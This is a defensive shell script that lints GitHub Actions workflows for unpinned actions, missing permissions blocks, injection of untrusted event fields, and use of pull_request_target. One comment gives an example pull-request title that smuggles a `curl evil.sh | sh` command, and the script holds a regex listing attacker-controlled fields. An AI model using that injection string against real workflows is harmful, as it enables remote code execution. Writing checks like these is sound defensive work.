#!/bin/sh
# Enforce the rules the workflows are supposed to follow. Each one is a rule a
# hurried edit breaks silently and that no other test would notice.
#
# Usage: scripts/lint-workflows.sh [dir]
set -eu

DIR=${1:-.github/workflows}
failures=0

pass() { printf '  ok    %s\n' "$1"; }
fail() { printf '  FAIL  %s\n' "$1"; failures=$((failures + 1)); }
show() { printf '%s\n' "$1" | sed 's/^/        /'; }

printf '\nLinting %s\n\n' "$DIR"

echo 'Pinning'
# A tag is a moving pointer. Whoever controls an action's repository can move
# `v4` to any commit they like, and every workflow trusting that tag then runs
# it with whatever token the workflow holds. A commit SHA cannot be moved.
unpinned=$(grep -Hn 'uses:' "$DIR"/*.yml \
  | grep -v 'uses: \./' \
  | grep -Ev 'uses: [^@]+@[0-9a-f]{40}' || true)
if [ -z "$unpinned" ]; then
  pass 'every action is pinned to a commit SHA'
else
  fail 'every action is pinned to a commit SHA'; show "$unpinned"
fi

# The SHA makes it safe; the comment makes it maintainable. Dependabot reads the
# comment to know which version a pin represents, and a human reading a bare
# forty-character hex string learns nothing at all from it.
uncommented=$(grep -Hn 'uses: [^@]*@[0-9a-f]\{40\}' "$DIR"/*.yml | grep -v '# v' || true)
if [ -z "$uncommented" ]; then
  pass 'every pin names its version in a comment'
else
  fail 'every pin names its version in a comment'; show "$uncommented"
fi

echo 'Permissions'
# Without an explicit block a workflow inherits the repository default, which
# may be write-all. Any step -- including one inside a dependency -- would then
# hold a token that can push to the default branch.
for f in "$DIR"/*.yml; do
  name=$(basename "$f")
  if grep -q '^permissions:' "$f"; then
    pass "$name declares top-level permissions"
  else
    fail "$name declares top-level permissions"
  fi
done

echo 'Untrusted input'
# GitHub interpolates these before the shell ever sees them, so a pull request
# titled `a"; curl evil.sh | sh; #` becomes part of the command. Passed through
# an environment variable instead, the shell treats it as data. The list is
# GitHub's own set of attacker-controlled event fields.
risky='github\.event\.(issue|pull_request|discussion)\.(title|body)'
risky="$risky|github\.event\.(comment|review)\.body"
risky="$risky|github\.event\.pull_request\.head\.(ref|label)"
risky="$risky|github\.event\.head_commit\.message|github\.head_ref"
inject=$(grep -HnE "\\\$\{\{[^}]*($risky)" "$DIR"/*.yml || true)
if [ -z "$inject" ]; then
  pass 'no attacker-controlled text is interpolated into a script'
else
  fail 'no attacker-controlled text is interpolated into a script'; show "$inject"
fi

# pull_request_target runs with the base repository's secrets while the pull
# request's own code sits in the tree. Checking that code out and running it
# hands any fork write access to this repository.
prt=$(grep -Hn 'pull_request_target' "$DIR"/*.yml || true)
if [ -z "$prt" ]; then
  pass 'no workflow uses pull_request_target'
else
  fail 'no workflow uses pull_request_target'; show "$prt"
fi

printf '\n'
if [ "$failures" -eq 0 ]; then
  echo 'All checks passed.'
else
  echo "$failures check(s) failed."
  exit 1
fi
